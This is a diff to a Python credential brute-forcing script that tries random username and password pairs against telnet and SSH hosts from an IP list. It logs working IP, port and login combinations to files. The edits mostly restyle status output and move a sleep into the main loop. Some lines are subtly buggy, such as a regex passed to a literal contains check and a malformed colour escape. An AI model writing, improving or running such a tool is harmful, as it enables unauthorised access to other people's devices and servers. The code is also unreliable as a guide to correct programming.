@@ -59,11 +59,11 @@ try:
 			)
 		sfw_combo = [ip.strip() for ip in sfw_combo]
 except:
-	print("\033[31mERRNO! No 'list.txt' found!\033[0m exit code 1")
+	print("\033[H\033[J")
+	print("\033[35mStatus: \033[31mNo list.txt exit code 1 \n\033[35mPort:\033[0m" + port+ "\n\033[35mTimeout:\033[0m" + timeout)
 	sys.exit()
 
 # check & register possible combos
-print("\033[H\033[J")
 class bruteforce:
 	def __init__(self, ip, port, user, passw):
 		self.ip = ip
@@ -75,13 +75,13 @@ class bruteforce:
 			file = open("telnet_list.txt", "a")
 			file.write(self.ip + ":" + self.port + " " + self.user + ":" + self.passw + "\n")
 			return(
-				"Successfully registered \033[35m" + self.ip + ":" + self.port + "\033[0m | \033[35mTimeout: \033[0m" + timeout + "\033[0m"
+				"\033[32mSuccessfully registered \033[35m" + self.ip + ":" + self.port + "\033[0m | \033[35mTimeout: \033[0m" + timeout + "\033[0m"
 				)
 		elif self.port == "22":
 			file = open("ssh_list.lst", "a")
 			file.write(self.ip + "/" + self.port) # + " " + self.user + "/" + self.passw + "\n")
 			return(
-				"Successfully registered \033[35m" + self.ip + ":" + self.port + "\033[0m | \033[35mTimeout: \033[0m" + timeout + "\033[0m"
+				"\033[32mSuccessfully registered \033[35m" + self.ip + ":" + self.port + "\033[0m | \033[35mTimeout: \033[0m" + timeout + "\033[0m"
 				)
 		elif self.ip.__contains__(
 			"[a-zA-Z]") or self.port.__contains__("[a-zA-Z]"):
@@ -107,20 +107,22 @@ def check_validity():
 		except:
 			return
 	else:
-		print("\033[31mCritical Error!\033[0m exit code 2")
+		print("\033[H\033[J")
+		print("\033[35mStatus: \033[31Critical error exit code 2 \n\033[35mPort:\033[0m" + port+ "\n\033[35mTimeout:\033[0m" + timeout)
 		sys.exit()	
 
 # start the bruteforce
 print("\033[H\033[J")
-time.sleep(timeout_int)
+print("\033[35mStatus: \033[32mConnected \n\033[35mPort:\033[0m" + port+ "\n\033[35mTimeout:\033[0m" + timeout)
 for single_ip in sfw_combo:
+	time.sleep(timeout_int)
 	random_user = random.choice(combo_user)
 	random_passw = random.choice(combo_passw)
 	config = (bruteforce(single_ip, port, random_user, random_passw))
 	print(config.is_usable())
 	check_validity()	
-	time.sleep(timeout_int)
 
 # exit code 0
-print("\033[32mDone!\033[0m exit code 0")
+print("\033[H\033[J")
+print("\033[35mStatus: \033[32mDone exit code 0 \n\033[35mPort:\033[0m" + port+ "\n\033[35mTimeout:\033[0m" + timeout)
 sys.exit()
